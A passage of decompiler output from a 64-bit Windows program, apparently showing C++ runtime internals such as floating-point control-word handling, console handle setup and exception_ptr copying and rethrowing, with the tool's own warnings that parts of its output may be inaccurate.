  char v13[32]; // [rsp+48h] [rbp-20h] BYREF

  sub_13F1687CC((__int64)&v12, a1);
  result = sub_13F177A58((__int64)v13, a2, a3, a4, a5, a6, a7, a8);
  if ( v13[16] )
    *(_DWORD *)(v12 + 936) &= ~2u;
  return result;
}

//----- (000000013F177E78) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F177E78()
{
  __int64 result; // rax

  result = MEMORY[0x76F80D10](L"CONOUT$", 0x40000000i64, 3i64, 0i64, 3, 0, 0i64);
  qword_13F1B7B70 = result;
  return result;
}
// 13F177EA7: write access to const memory at 13F1B7B70 has been detected
// 13F196430: using guessed type wchar_t aConout[8];
// 13F1B7B70: using guessed type __int64 qword_13F1B7B70;

//----- (000000013F177EB4) ----------------------------------------------------
__int64 sub_13F177EB4()
{
  return 0i64;
}
// 13F177EB4: using guessed type __int64 __fastcall sub_13F177EB4();
// 13F1B7B70: using guessed type __int64 qword_13F1B7B70;

//----- (000000013F177ED4) ----------------------------------------------------
int sub_13F177ED4()
{
  char v0; // bl
  int result; // eax

  v0 = sub_13F1765D0();
  sub_13F1765EA();
  result = 0;
  if ( (v0 & 0x3F) != 0 )
  {
    if ( (v0 & 1) != 0 )
      result = 16;
    if ( (v0 & 4) != 0 )
      result |= 8u;
    if ( (v0 & 8) != 0 )
      result |= 4u;
    if ( (v0 & 0x10) != 0 )
      result |= 2u;
    if ( (v0 & 0x20) != 0 )
      result |= 1u;
    if ( (v0 & 2) != 0 )
      return result | 0x80000;
  }
  return result;
}

//----- (000000013F177F28) ----------------------------------------------------
int __fastcall sub_13F177F28(int a1, int a2)
{
  return sub_13F177F7C(a1, a2 & 0xFFF7FFFF);
}

//----- (000000013F177F34) ----------------------------------------------------
__int64 sub_13F177F34()
{
  char v0; // dl
  unsigned int v1; // ecx

  v0 = _mm_getcsr();
  v1 = 0;
  if ( (v0 & 0x3F) != 0 )
  {
    if ( (v0 & 1) != 0 )
      v1 = 16;
    if ( (v0 & 4) != 0 )
      v1 |= 8u;
    if ( (v0 & 8) != 0 )
      v1 |= 4u;
    if ( (v0 & 0x10) != 0 )
      v1 |= 2u;
    if ( (v0 & 0x20) != 0 )
      v1 |= 1u;
    if ( (v0 & 2) != 0 )
      v1 |= 0x80000u;
  }
  return v1;
}

//----- (000000013F177F7C) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
int __fastcall sub_13F177F7C(int a1, int a2)
{
  int v3; // ebx
  __int16 v4; // r9
  int v5; // edi
  int result; // eax
  int v7; // ecx
  int v8; // er9
  int v9; // er9
  int v10; // ecx
  unsigned int v11; // ebx
  int v12; // eax
  int v13; // ecx
  int v14; // eax
  int v15; // ebx
  int v16; // ebx

  v3 = a2 & 0x308031F;
  v4 = sub_13F1765D0();
  v5 = 0;
  result = 0;
  if ( (v4 & 0x80) != 0 )
    result = 16;
  if ( (v4 & 0x200) != 0 )
    result |= 8u;
  if ( (v4 & 0x400) != 0 )
    result |= 4u;
  if ( (v4 & 0x800) != 0 )
    result |= 2u;
  if ( (v4 & 0x1000) != 0 )
    result |= 1u;
  if ( (v4 & 0x100) != 0 )
    result |= 0x80000u;
  v7 = v4 & 0x6000;
  if ( (v4 & 0x6000) != 0 )
  {
    switch ( v7 )
    {
      case 8192:
        result |= 0x100u;
        break;
      case 16384:
        result |= 0x200u;
        break;
      case 24576:
        result |= 0x300u;
        break;
    }
  }
  v8 = (v4 & 0x8040) - 64;
  if ( v8 )
  {
    v9 = v8 - 32704;
    if ( v9 )
    {
      if ( v9 == 64 )
        result |= 0x1000000u;
    }
    else
    {
      result |= 0x3000000u;
    }
  }
  else
  {
    result |= 0x2000000u;
  }
  v10 = v3 & a1 | result & ~v3;
  if ( v10 != result )
  {
    v11 = 0;
    if ( (v10 & 0x10) != 0 )
      v11 = 128;
    if ( (v10 & 8) != 0 )
      v11 |= 0x200u;
    if ( (v10 & 4) != 0 )
      v11 |= 0x400u;
    if ( (v10 & 2) != 0 )
      v11 |= 0x800u;
    if ( (v10 & 1) != 0 )
      v11 |= 0x1000u;
    if ( (v10 & 0x80000) != 0 )
      v11 |= 0x100u;
    v12 = v10 & 0x300;
    if ( (v10 & 0x300) != 0 )
    {
      switch ( v12 )
      {
        case 256:
          v11 |= 0x2000u;
          break;
        case 512:
          v11 |= 0x4000u;
          break;
        case 768:
          v11 |= 0x6000u;
          break;
      }
    }
    v13 = v10 & 0x3000000;
    switch ( v13 )
    {
      case 16777216:
        v11 |= 0x8040u;
        break;
      case 33554432:
        v11 |= 0x40u;
        break;
      case 50331648:
        v11 |= 0x8000u;
        break;
    }
    if ( (v11 & 0x40) == 0 )
      v11 &= ~0x40u;
    sub_13F1765E0(v11);
    if ( (v11 & 0x80u) != 0 )
      v5 = 16;
    if ( (v11 & 0x200) != 0 )
      v5 |= 8u;
    if ( (v11 & 0x400) != 0 )
      v5 |= 4u;
    if ( (v11 & 0x800) != 0 )
      v5 |= 2u;
    if ( (v11 & 0x1000) != 0 )
      v5 |= 1u;
    if ( (v11 & 0x100) != 0 )
      v5 |= 0x80000u;
    v14 = v11 & 0x6000;
    if ( (v11 & 0x6000) != 0 )
    {
      switch ( v14 )
      {
        case 8192:
          v5 |= 0x100u;
          break;
        case 16384:
          v5 |= 0x200u;
          break;
        case 24576:
          v5 |= 0x300u;
          break;
      }
    }
    v15 = (v11 & 0x8040) - 64;
    if ( !v15 )
      return v5 | 0x2000000;
    v16 = v15 - 32704;
    if ( !v16 )
      return v5 | 0x3000000;
    if ( v16 == 64 )
      return v5 | 0x1000000;
    return v5;
  }
  return result;
}
// 13F178137: write access to const memory at 13F1B7B78 has been detected
// 13F1B7B78: using guessed type char byte_13F1B7B78;

//----- (000000013F178228) ----------------------------------------------------
__int64 __fastcall sub_13F178228(__int64 a1)
{
  __int64 *v2; // rbx
  __int64 v3; // rdi

  if ( !_InterlockedIncrement(&dword_13F1B7B80) )
  {
    v2 = qword_13F1C6AB0;
    v3 = 8i64;
    do
    {
      sub_13F1790B4();
      v2 += 5;
      --v3;
    }
    while ( v3 );
  }
  return a1;
}
// 13F1B7B80: using guessed type int dword_13F1B7B80;
// 13F1C6AB0: using guessed type __int64 qword_13F1C6AB0[4];

//----- (000000013F178274) ----------------------------------------------------
int *__fastcall sub_13F178274(int *a1, int a2)
{
  *a1 = a2;
  if ( a2 )
  {
    if ( a2 < 8 )
      sub_13F1419D8(&qword_13F1C6AB0[5 * a2]);
  }
  else
  {
    sub_13F170698();
  }
  return a1;
}
// 13F1419D8: using guessed type __int64 __fastcall sub_13F1419D8(_QWORD);
// 13F1C6AB0: using guessed type __int64 qword_13F1C6AB0[4];

//----- (000000013F1782B0) ----------------------------------------------------
__int64 sub_13F1782B0()
{
  __int64 result; // rax
  __int64 *v1; // rbx
  __int64 v2; // rdi

  result = (unsigned int)_InterlockedExchangeAdd(&dword_13F1B7B80, 0xFFFFFFFF);
  if ( (int)result - 1 < 0 )
  {
    v1 = qword_13F1C6AB0;
    v2 = 8i64;
    do
    {
      result = sub_13F1417C0(v1);
      v1 += 5;
      --v2;
    }
    while ( v2 );
  }
  return result;
}
// 13F1417C0: using guessed type __int64 __fastcall sub_13F1417C0(_QWORD);
// 13F1B7B80: using guessed type int dword_13F1B7B80;
// 13F1C6AB0: using guessed type __int64 qword_13F1C6AB0[4];

//----- (000000013F1782F4) ----------------------------------------------------
void __fastcall sub_13F1782F4(int *a1)
{
  __int64 v1; // rax

  v1 = *a1;
  if ( (_DWORD)v1 )
  {
    if ( (int)v1 < 8 )
      sub_13F141BDC(&qword_13F1C6AB0[5 * v1]);
  }
  else
  {
    sub_13F1706A8();
  }
}
// 13F141BDC: using guessed type __int64 __fastcall sub_13F141BDC(_QWORD);
// 13F1C6AB0: using guessed type __int64 qword_13F1C6AB0[4];

//----- (000000013F178328) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
void sub_13F178328()
{
  ;
}
// 13F17833C: write access to const memory at 13F1C6C40 has been detected
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F178390) ----------------------------------------------------
__int64 sub_13F178390()
{
  MEMORY[0]();
  return 1i64;
}
// 13F178390: using guessed type __int64 __fastcall sub_13F178390();
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F1783AC) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F1783AC(__int64 a1)
{
  int v3; // [rsp+40h] [rbp+8h] BYREF

  sub_13F178274(&v3, 1);
  qword_13F1C6CC0 = a1;
  sub_13F16C244((unsigned __int64)sub_13F178390 & -(__int64)(a1 != 0));
  sub_13F1782F4(&v3);
  return 0i64;
}
// 13F1783DA: write access to const memory at 13F1C6CC0 has been detected
// 13F178390: using guessed type __int64 __fastcall sub_13F178390();
// 13F1C6CC0: using guessed type __int64 qword_13F1C6CC0;

//----- (000000013F178418) ----------------------------------------------------
__int64 __fastcall sub_13F178418(__int64 a1)
{
  return *(_QWORD *)a1;
}

//----- (000000013F17841C) ----------------------------------------------------
_QWORD *__fastcall sub_13F17841C(_QWORD *a1, __int64 a2, __int64 *a3, char *a4)
{
  char *v7; // rdi

  v7 = sub_13F178D0C(0xB0ui64);
  *((_DWORD *)v7 + 2) = 1;
  *((_DWORD *)v7 + 3) = 1;
  *(_QWORD *)v7 = &std::_Ref_count_obj_alloc<__ExceptionPtr,_StaticAllocator<int>>::`vftable';
  sub_13F15EF70((__int64)(v7 + 16), 0, 0xA0ui64);
  sub_13F178540((__int64)(v7 + 16), *a3, *a4);
  *a1 = v7 + 16;
  a1[1] = v7;
  return a1;
}
// 13F1975F8: using guessed type void *std::_Ref_count_obj_alloc<__ExceptionPtr,_StaticAllocator<int>>::`vftable';

//----- (000000013F1784B0) ----------------------------------------------------
_QWORD *__fastcall sub_13F1784B0(_QWORD *a1, __int64 *a2, char *a3)
{
  __int64 v6; // rax
  __int64 v7; // rbx

  v6 = sub_13F14059C(176i64);
  v7 = v6;
  if ( v6 )
  {
    *(_DWORD *)(v6 + 8) = 1;
    *(_DWORD *)(v6 + 12) = 1;
    *(_QWORD *)v6 = &std::_Ref_count_obj<__ExceptionPtr>::`vftable';
    sub_13F178540(v6 + 16, *a2, *a3);
  }
  else
  {
    v7 = 0i64;
  }
  *a1 = v7 + 16;
  a1[1] = v7;
  return a1;
}
// 13F197620: using guessed type void *std::_Ref_count_obj<__ExceptionPtr>::`vftable';

//----- (000000013F178540) ----------------------------------------------------
__int64 __fastcall sub_13F178540(__int64 a1, __int64 a2, char a3)
{
  __int64 v3; // r9
  int v6; // eax
  __int64 v8; // r8
  __int64 v9; // rdx
  int v10; // ecx
  __int64 v11; // rsi
  __int64 v12; // rax
  __int64 v13; // rcx
  __int64 v14; // rbp
  unsigned __int64 v15; // rcx
  __m128i *v16; // rax
  __m128i *v17; // rsi
  __int64 pExceptionObject[5]; // [rsp+30h] [rbp-28h] BYREF

  *(_BYTE *)(a1 + 152) = a3;
  v3 = 0i64;
  *(_DWORD *)a1 = *(_DWORD *)a2;
  v6 = *(_DWORD *)(a2 + 4);
  *(_QWORD *)(a1 + 8) = 0i64;
  v8 = 15i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  *(_DWORD *)(a1 + 4) = v6;
  v9 = *(unsigned int *)(a2 + 24);
  *(_DWORD *)(a1 + 24) = v9;
  if ( (_DWORD)v9 )
  {
    do
    {
      if ( (unsigned int)v3 >= 0xF )
        break;
      *(_QWORD *)(a1 + 8 * v3 + 32) = *(_QWORD *)(a2 + 8 * v3 + 32);
      v3 = (unsigned int)(v3 + 1);
      v9 = *(unsigned int *)(a1 + 24);
    }
    while ( (unsigned int)v3 < (unsigned int)v9 );
  }
  if ( (unsigned int)v9 < 0xF )
    sub_13F15EF70(a1 + 8 * ((unsigned int)v9 + 4i64), 0, 8i64 * (unsigned int)(15 - v9));
  if ( *(_DWORD *)a2 == -529697949 && *(_DWORD *)(a2 + 24) == 4 )
  {
    v10 = *(_DWORD *)(a2 + 32);
    if ( (unsigned int)(v10 - 429065504) <= 2 || v10 == 26820608 )
    {
      *(_QWORD *)(a1 + 40) = 0i64;
      if ( !*(_QWORD *)(a2 + 40)
        || (v11 = *(_QWORD *)(a2 + 48)) == 0
        || !*(_DWORD *)(v11 + 12)
        || *(int *)(*(int *)(v11 + 12) + *(_QWORD *)(a1 + 56)) <= 0 )
      {
        sub_13F16A158();
      }
      v12 = MEMORY[0x771C0850](*(_QWORD *)(a2 + 48), v9, v8);
      v13 = *(_QWORD *)(a1 + 56);
      *(_QWORD *)(a1 + 48) = v12;
      v14 = v13 + *(int *)(*(int *)(v11 + 12) + v13 + 4);
      v15 = *(int *)(v14 + 20);
      if ( a3 )
        v16 = (__m128i *)sub_13F16A298(v15);
      else
        v16 = (__m128i *)sub_13F178D0C(v15);
      v17 = v16;
      if ( !v16 )
      {
        sub_13F109748(pExceptionObject);
        CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
      }
      sub_13F17884C(a1, v16, *(const __m128i **)(a2 + 40), *(int *)(v14 + 20), v14);
      *(_QWORD *)(a1 + 40) = v17;
    }
  }
  return a1;
}
// 13F17862D: variable 'v9' is possibly undefined
// 13F17862D: variable 'v8' is possibly undefined
// 13F16A298: using guessed type __int64 __fastcall sub_13F16A298(_QWORD);
// 13F178540: using guessed type _QWORD pExceptionObject[5];

//----- (000000013F1786C0) ----------------------------------------------------
void __fastcall sub_13F1786C0(__int64 a1)
{
  int v2; // ecx
  __int64 v3; // rax
  __int64 *v4; // rcx
  __int64 v5; // r9
  __int64 v6; // r8
  __int64 v7; // rcx

  if ( *(_BYTE *)(a1 + 152) )
  {
    if ( *(_DWORD *)a1 == -529697949 && *(_DWORD *)(a1 + 24) == 4 )
    {
      v2 = *(_DWORD *)(a1 + 32);
      if ( (unsigned int)(v2 - 429065504) <= 2 || v2 == 26820608 )
      {
        v3 = MEMORY[0x771B7DE0](*(_QWORD *)(a1 + 48));
        if ( !v3 )
          sub_13F16A158();
        v4 = *(__int64 **)(a1 + 40);
        if ( v4 )
        {
          v5 = *(_QWORD *)(a1 + 56);
          v6 = *(int *)(*(int *)(v3 + 12) + v5 + 4);
          if ( *(_DWORD *)(v3 + 4) )
          {
            ((void (__fastcall *)(__int64 *, __int64, __int64))(v5 + *(int *)(v3 + 4)))(v4, v5 + *(int *)(v3 + 4), v6);
          }
          else if ( (*(_BYTE *)(v6 + v5) & 8) != 0 )
          {
            v7 = *v4;
            if ( v7 )
              (*(void (__fastcall **)(__int64))(*(_QWORD *)v7 + 16i64))(v7);
          }
        }
        sub_13F16A188(*(_QWORD *)(a1 + 40));
      }
    }
  }
}
// 13F16A188: using guessed type __int64 __fastcall sub_13F16A188(_QWORD);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F178778) ----------------------------------------------------
__int64 __fastcall sub_13F178778(__int64 a1, char a2)
{
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 176i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F17879C) ----------------------------------------------------
__int64 __fastcall sub_13F17879C(__int64 a1, char a2)
{
  volatile signed __int32 *v2; // rbx

  v2 = *(volatile signed __int32 **)(a1 + 8);
  if ( v2 )
  {
    if ( _InterlockedExchangeAdd(v2 + 2, 0xFFFFFFFF) == 1 )
    {
      (**(void (__fastcall ***)(volatile signed __int32 *))v2)(v2);
      if ( _InterlockedExchangeAdd(v2 + 3, 0xFFFFFFFF) == 1 )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v2 + 8i64))(v2);
    }
  }
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 16i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F178818) ----------------------------------------------------
__int64 *sub_13F178818()
{
  if ( !(unsigned int)sub_13F10A28C(
                        qword_13F1C6CD0,
                        (unsigned int (__fastcall *)(volatile signed __int64 *, __int64, __int64))sub_13F178A90,
                        (__int64)qword_13F1C6CE0) )
    sub_13F16A158();
  return qword_13F1C6CE0;
}
// 13F1C6CD0: using guessed type __int64 qword_13F1C6CD0[2];
// 13F1C6CE0: using guessed type __int64 qword_13F1C6CE0[49];

//----- (000000013F17884C) ----------------------------------------------------
__m128i *__fastcall sub_13F17884C(__int64 a1, __m128i *a2, const __m128i *a3, unsigned __int64 a4, __int64 a5)
{
  __int64 v8; // r10
  __int64 (__fastcall *v9)(__int64, __int64); // rbx
  __int64 v10; // rdx
  __int64 v11; // rcx
  __int64 v12; // rdx
  __int64 v13; // r8
  __m128i *result; // rax
  __int64 v15; // rax

  if ( (*(_BYTE *)a5 & 1) != 0
    || ((v8 = *(int *)(a5 + 24), v9 = 0i64, !(_DWORD)v8) ? (v12 = 0i64, v11 = 0i64) : (v10 = *(_QWORD *)(a1 + 56),
                                                                                       v11 = *(int *)(a5 + 24),
                                                                                       v12 = v8 + v10),
        !v12) )
  {
    result = sub_13F15EB00(a2, a3, a4);
    if ( (*(_BYTE *)a5 & 8) != 0 && a3->m128i_i64[0] )
      return (__m128i *)(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a3->m128i_i64[0] + 8i64))(a3->m128i_i64[0]);
  }
  else if ( (*(_BYTE *)a5 & 4) != 0 )
  {
    if ( (_DWORD)v8 )
      v9 = (__int64 (__fastcall *)(__int64, __int64))(v11 + *(_QWORD *)(a1 + 56));
    v13 = sub_13F15E748((__int64)a3, (int *)(a5 + 8));
    return (__m128i *)sub_13F1612E4((__int64)a2, (__int64 (__fastcall *)(__int64, __int64, _QWORD))v9, v13, 1u);
  }
  else
  {
    if ( (_DWORD)v8 )
      v9 = (__int64 (__fastcall *)(__int64, __int64))(v11 + *(_QWORD *)(a1 + 56));
    v15 = sub_13F15E748((__int64)a3, (int *)(a5 + 8));
    return (__m128i *)sub_13F1612D8((__int64)a2, v9, v15);
  }
  return result;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F178938) ----------------------------------------------------
_QWORD *__fastcall sub_13F178938(_QWORD *a1)
{
  __int64 *v2; // rdx
  __int64 v4; // [rsp+48h] [rbp+10h] BYREF

  if ( !*(_QWORD *)sub_13F15E7B8()
    || *(_DWORD *)sub_13F15E7CC()
    || **(_DWORD **)sub_13F15E7B8() == -532459699
    || **(_DWORD **)sub_13F15E7B8() == -532462766 )
  {
    *a1 = 0i64;
    a1[1] = 0i64;
    return a1;
  }
  else
  {
    LOBYTE(v4) = 1;
    v2 = (__int64 *)sub_13F15E7B8();
    sub_13F1784B0(a1, v2, (char *)&v4);
    return a1;
  }
}

//----- (000000013F1789BC) ----------------------------------------------------
__int64 __fastcall sub_13F1789BC(__int64 a1)
{
  __int64 result; // rax

  if ( a1 )
    return (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)a1 + 16i64))(a1, 1i64);
  return result;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F1789DC) ----------------------------------------------------
__int64 __fastcall sub_13F1789DC(__int64 a1)
{
  return (*(__int64 (__fastcall **)(__int64, _QWORD))(*(_QWORD *)a1 + 16i64))(a1, 0i64);
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F1789EC) ----------------------------------------------------
void __fastcall sub_13F1789EC(__int64 a1)
{
  sub_13F1786C0(a1 + 16);
}

//----- (000000013F1789F8) ----------------------------------------------------
_QWORD *__fastcall sub_13F1789F8(_QWORD *a1)
{
  __int64 (__fastcall **v3)(); // [rsp+28h] [rbp-58h] BYREF
  __int64 v4[2]; // [rsp+30h] [rbp-50h] BYREF
  char v5[64]; // [rsp+40h] [rbp-40h] BYREF
  _QWORD *v6; // [rsp+90h] [rbp+10h] BYREF
  char v7; // [rsp+98h] [rbp+18h] BYREF
  __int64 v8; // [rsp+A0h] [rbp+20h] BYREF

  v6 = a1;
  v4[1] = 0i64;
  v4[0] = (__int64)"bad allocation";
  v3 = off_13F180600;
  v8 = sub_13F178AB0((__int64)v5, &v3, &_TI2_AVbad_alloc_std__);
  LOBYTE(v6) = 0;
  sub_13F17841C(a1, (__int64)&v7, &v8, (char *)&v6);
  v3 = (__int64 (__fastcall **)())&std::exception::`vftable';
  sub_13F15E4FC((__int64)v4);
  return a1;
}
// 13F180600: using guessed type __int64 (__fastcall *off_13F180600[2])();
// 13F1789F8: using guessed type char var_40[64];

//----- (000000013F178A90) ----------------------------------------------------
__int64 __fastcall sub_13F178A90(__int64 a1, _QWORD *a2)
{
  sub_13F1789F8(a2);
  return 1i64;
}

//----- (000000013F178AB0) ----------------------------------------------------
__int64 __fastcall sub_13F178AB0(__int64 a1, _QWORD *a2, _BYTE *a3)
{
  _BYTE *v3; // rdi
  __int64 v5; // rax
  __int64 v7; // [rsp+30h] [rbp+8h] BYREF

  *(_QWORD *)(a1 + 8) = 0i64;
  v3 = a3;
  *(_QWORD *)(a1 + 16) = 0i64;
  *(_DWORD *)a1 = -529697949;
  *(_DWORD *)(a1 + 4) = 1;
  *(_DWORD *)(a1 + 24) = 4;
  *(_DWORD *)(a1 + 32) = 429065504;
  *(_QWORD *)(a1 + 40) = a2;
  if ( a3 && (*a3 & 0x10) != 0 )
    v3 = *(_BYTE **)(*(_QWORD *)(*a2 - 8i64) + 48i64);
  *(_QWORD *)(a1 + 48) = v3;
  v5 = MEMORY[0x76FA0500](v3, &v7);
  v7 = v5;
  *(_QWORD *)(a1 + 56) = v5;
  if ( v3 && ((*v3 & 8) != 0 || !v5) )
    *(_DWORD *)(a1 + 32) = 26820608;
  return a1;
}

//----- (000000013F178B40) ----------------------------------------------------
__int64 __fastcall sub_13F178B40(__int64 a1)
{
  __int128 v2; // xmm1
  __int64 v3; // rax
  __int128 v4; // xmm0
  __int128 v5; // xmm1
  __int128 v6; // xmm0
  __int128 v7; // xmm1
  __int128 v8; // xmm0
  __int128 v9; // xmm1
  unsigned int v10; // er10
  __int64 v11; // r8
  __int64 v12; // rax
  __int64 v13; // rdx
  __int64 v14; // rcx
  unsigned __int64 v15; // r9
  __int64 v16; // rax
  void *v17; // rsp
  __m128i pExceptionObject[2]; // [rsp+30h] [rbp+0h] BYREF
  __int128 v20; // [rsp+50h] [rbp+20h]
  __int128 v21; // [rsp+60h] [rbp+30h]
  __int128 v22; // [rsp+70h] [rbp+40h] BYREF
  __int128 v23; // [rsp+80h] [rbp+50h]
  __int128 v24; // [rsp+90h] [rbp+60h]
  __int128 v25; // [rsp+A0h] [rbp+70h]
  __int128 v26; // [rsp+B0h] [rbp+80h]
  __int128 v27; // [rsp+C0h] [rbp+90h]
  __int128 v28; // [rsp+D0h] [rbp+A0h]
  __int64 v29; // [rsp+E0h] [rbp+B0h]

  if ( !a1 )
  {
    sub_13F160CAC((_QWORD *)pExceptionObject);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_exception_std__);
  }
  v2 = *(_OWORD *)(a1 + 16);
  v20 = *(_OWORD *)a1;
  v3 = *(_QWORD *)(a1 + 144);
  v4 = *(_OWORD *)(a1 + 32);
  v21 = v2;
  v5 = *(_OWORD *)(a1 + 48);
  v22 = v4;
  v6 = *(_OWORD *)(a1 + 64);
  v23 = v5;
  v7 = *(_OWORD *)(a1 + 80);
  v24 = v6;
  v8 = *(_OWORD *)(a1 + 96);
  v25 = v7;
  v9 = *(_OWORD *)(a1 + 128);
  v26 = v8;
  v27 = *(_OWORD *)(a1 + 112);
  v28 = v9;
  v29 = v3;
  v10 = v20;
  v11 = DWORD2(v21);
  if ( (_DWORD)v20 == -529697949 && DWORD2(v21) == 4 )
  {
    if ( (unsigned int)(v22 - 429065504) > 2 && (_DWORD)v22 != 26820608 )
      return MEMORY[0x76F7C3C0](v10, DWORD1(v20), v11, &v22);
    v12 = MEMORY[0x771B7DE0](v23);
    if ( !*((_QWORD *)&v22 + 1)
      || !v12
      || !*(_DWORD *)(v12 + 12)
      || (v13 = *(_QWORD *)(a1 + 56), *(int *)(*(int *)(v12 + 12) + v13) <= 0) )
    {
      sub_13F16A158();
    }
    *(_QWORD *)&v23 = v12;
    v14 = v13 + *(int *)(*(int *)(v12 + 12) + v13 + 4);
    v15 = *(int *)(v14 + 20);
    v16 = v15 + 15;
    if ( v15 + 15 <= v15 )
      v16 = 0xFFFFFFFFFFFFFF0i64;
    v17 = alloca(v16 & 0xFFFFFFFFFFFFFFF0ui64);
    sub_13F17884C(a1, pExceptionObject, *((const __m128i **)&v22 + 1), v15, v14);
    v11 = DWORD2(v21);
    v10 = v20;
    *((_QWORD *)&v22 + 1) = pExceptionObject;
  }
  if ( (unsigned int)v11 > 0xF )
    v11 = 15i64;
  DWORD2(v21) = v11;
  return MEMORY[0x76F7C3C0](v10, DWORD1(v20), v11, &v22);
}
// 13F178B40: using guessed type __m128i pExceptionObject[2];

//----- (000000013F178D0C) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
char *__fastcall sub_13F178D0C(unsigned __int64 a1)
{
  __int64 v1; // rdx
  unsigned __int64 v2; // rax
  unsigned __int64 v3; // r8
  char *result; // rax

  v1 = 232i64;
  v2 = (unsigned __int64)&qword_13F1C6E68[-29] & 0xF;
  v3 = 16 - v2;
  if ( !v2 )
    v3 = 0i64;
  if ( v3 > 0xE8 || 232 - v3 < a1 )
  {
    result = 0i64;
  }
  else
  {
    v1 = 232 - v3;
    qword_13F1B7B88 = 232 - v3;
    result = (char *)&qword_13F1C6E68[-29] + v3;
  }
  if ( !result )
    sub_13F16A158();
  qword_13F1B7B88 = v1 - a1;
  return result;
}
// 13F178D4A: write access to const memory at 13F1B7B88 has been detected
// 13F178D61: write access to const memory at 13F1B7B88 has been detected
// 13F1B7B88: using guessed type __int64 qword_13F1B7B88;
// 13F1C6E68: using guessed type __int64 qword_13F1C6E68[9];

//----- (000000013F178D74) ----------------------------------------------------
__int64 __fastcall sub_13F178D74(_QWORD *a1, _QWORD *a2)
{
  __int64 v2; // rax
  __int64 result; // rax

  *a1 = 0i64;
  a1[1] = 0i64;
  v2 = a2[1];
  if ( v2 )
    _InterlockedIncrement((volatile signed __int32 *)(v2 + 8));
  *a1 = *a2;
  result = a2[1];
  a1[1] = result;
  return result;
}

//----- (000000013F178D9C) ----------------------------------------------------
void __fastcall sub_13F178D9C(_QWORD *a1)
{
  *a1 = 0i64;
  a1[1] = 0i64;
}

//----- (000000013F178DA8) ----------------------------------------------------
__int64 __fastcall sub_13F178DA8(_QWORD *a1)
{
  __int64 v2; // rdx
  __int64 result; // rax
  __int64 v4; // rbx
  __int64 v5; // [rsp+20h] [rbp-18h] BYREF
  __int64 v6; // [rsp+28h] [rbp-10h]

  sub_13F178938(&v5);
  v2 = v6;
  *a1 = 0i64;
  a1[1] = 0i64;
  if ( v2 )
  {
    _InterlockedIncrement((volatile signed __int32 *)(v2 + 8));
    v2 = v6;
  }
  result = v5;
  *a1 = v5;
  a1[1] = v2;
  if ( v2 )
  {
    result = (unsigned int)_InterlockedExchangeAdd((volatile signed __int32 *)(v2 + 8), 0xFFFFFFFF);
    if ( (_DWORD)result == 1 )
    {
      v4 = v6;
      (**(void (__fastcall ***)(__int64))v6)(v6);
      result = (unsigned int)_InterlockedExchangeAdd((volatile signed __int32 *)(v4 + 12), 0xFFFFFFFF);
      if ( (_DWORD)result == 1 )
        return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v6 + 8i64))(v6);
    }
  }
  return result;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F178E30) ----------------------------------------------------
__int64 __fastcall sub_13F178E30(__int64 a1)
{
  return sub_13F17879C(a1, 0);
}

//----- (000000013F178E38) ----------------------------------------------------
void __fastcall __noreturn sub_13F178E38(__int64 a1)
{
  __int64 v1; // rax

  v1 = sub_13F178418(a1);
  sub_13F178B40(v1);
  JUMPOUT(0x13F178E49i64);
}
// 13F178E44: control flows out of bounds to 13F178E49

//----- (000000013F178E4C) ----------------------------------------------------
_QWORD *__fastcall sub_13F178E4C(__int64 (__fastcall ***a1)())
{
  __int64 (__fastcall **v2)(); // rax

  if ( _security_cookie != 0x2CC598517BDEi64 )
  {
    v2 = off_13F197678;
  }
  else
  {
    if ( _security_cookie == 0x2CC5986D15CEi64 )
    {
      *a1 = (__int64 (__fastcall **)())off_13F1976A8;
      return sub_13F14C8EC(a1 + 1);
    }
    v2 = off_13F197648;
  }
  *a1 = v2;
  return (_QWORD *)((__int64 (__fastcall *)(__int64 (__fastcall ***)(), uintptr_t))(_security_cookie ^ 0x2CC5986D15CEi64))(
                     a1 + 1,
                     _security_cookie);
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F197648: using guessed type __int64 (__fastcall *off_13F197648[5])();
// 13F197678: using guessed type __int64 (__fastcall *off_13F197678[6])();
// 13F1976A8: using guessed type void *off_13F1976A8[5];
// 13F1C42F8: using guessed type __int64 qword_13F1C42F8;
// 13F1C4328: using guessed type __int64 qword_13F1C4328;

//----- (000000013F178EB0) ----------------------------------------------------
char __fastcall sub_13F178EB0(__int64 a1)
{
  return sub_13F14C9A0((_QWORD *)(a1 + 8));
}

//----- (000000013F178EBC) ----------------------------------------------------
